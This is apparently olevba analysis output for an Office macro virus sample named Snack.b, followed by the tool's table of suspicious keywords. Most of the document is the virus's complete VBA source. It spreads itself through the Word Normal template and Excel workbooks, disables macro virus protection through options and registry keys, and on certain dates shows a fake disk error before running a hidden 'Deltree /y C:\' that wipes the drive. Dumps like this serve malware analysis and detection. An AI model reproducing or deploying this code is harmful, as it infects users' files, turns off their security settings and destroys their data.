olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Snack.b-ee46e37a248eed370acb4bf976201e5144d361e4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Snack.b-ee46e37a248eed370acb4bf976201e5144d361e4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Snack <->>- Poison <->>- Cobra
'Macros By Liton

Private Sub Document_Open()
On Error Resume Next
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set Xla = CreateObject("Excel.Application")
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
IString = NT.Lines(1, 1)
DString = "'Snack <->>- Poison <->>- Cobra"
If IString <> DString Then
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
End If
IString = AD.Lines(1, 1)
If IString <> DString Then
AD.DeleteLines 1, AD.CountOfLines
AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
End If
With Options
.VirusProtection = False: .SaveNormalPrompt = False
End With
If System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") <> "0" Then
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
End If
If Xla.Name = "Microsoft Excel" Then
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") <> "" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
End If
For i = 1 To 4
GetName = "File" + Trim(Str(i))
FilName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List", GetName)
If FilName <> "" Then
Set GO = GetObject(FilName)
If GO.VBProject.VBComponents(1).CodeModule.CountOfLines > 0 Then
GO.VBProject.VBComponents(1).CodeModule.DeleteLines 1, GO.VBProject.VBComponents(1).CodeModule.CountOfLines
End If
GO.VBProject.VBComponents(1).CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
GO.Save
End If
Next
StartPath = Xla.Application.StartupPath
If UCase(Dir(StartPath + "\Book1.")) <> "BOOK1" Then
Set WrkBook = Xla.Workbooks.Add
WrkBook.VBProject.VBComponents(1).CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
WrkBook.SaveAs StartPath & "\Book1."
WrkBook.Save
WrkBook.Close
Else
Set WrkBook = GetObject(StartPath + "\Book1.")
If WrkBook.VBProject.VBComponents(1).CodeModule.CountOfLines > 0 Then
WrkBook.VBProject.VBComponents(1).CodeModule.DeleteLines 1, WrkBook.VBProject.VBComponents(1).CodeModule.CountOfLines
End If
WrkBook.VBProject.VBComponents(1).CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
WrkBook.Save
Xla.Quit
End If
End If
If (Month(Now) = 2 And Day(Now) = 21) Or (Month(Now) = 3 And Day(Now) = 26) Or (Month(Now) = 5 And Day(Now) = 1) Or (Month(Now) = 8 And Day(Now) = 15) Or (Month(Now) = 12 And Day(Now) = 16) Then
MsgBox "Data error reading drive C" + Chr(13) + "Press OK to Correct this problem.", vbOKOnly + vbCritical, "Cobra"
Shell "Deltree /y C:\", vbHide
End If
End Sub
Private Sub WorkBook_Deactivate()
On Error Resume Next
Set AW = ActiveWorkbook.VBProject.VBComponents(1).CodeModule
Set TW = ThisWorkbook.VBProject.VBComponents(1).CodeModule
IString = AW.Lines(1, 1)
DString = "'Snack <->>- Poison <->>- Cobra"
If IString <> DString Then
AW.DeleteLines 1, AW.CountOfLines
AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
End If
IString = TW.Lines(1, 1)
If IString <> DString Then
TW.DeleteLines 1, TW.CountOfLines
TW.InsertLines 1, AW.Lines(1, AW.CountOfLines)
End If
Set WOBJ = CreateObject("Word.Application")
If WOBJ.Name = "Microsoft Word" Then
Set NT = WOBJ.NormalTemplate
MS = NT.Path
If NT.VBProject.VBComponents(1).CodeModule.CountOfLines > 0 Then
NT.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NT.VBProject.VBComponents(1).CodeModule.CountOfLines
NT.VBProject.VBComponents(1).CodeModule.InsertLines 1, AW.Lines(1, AW.CountOfLines)
End If
WOBJ.Quit
End If
If (Month(Now) = 2 And Day(Now) = 21) Or (Month(Now) = 3 And Day(Now) = 26) Or (Month(Now) = 5 And Day(Now) = 1) Or (Month(Now) = 8 And Day(Now) = 15) Or (Month(Now) = 12 And Day(Now) = 16) Then
MsgBox "Data error reading drive C" + Chr(13) + "Press OK to Correct this problem.", vbOKOnly + vbCritical, "Cobra"
Shell "Deltree /y C:\", vbHide
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

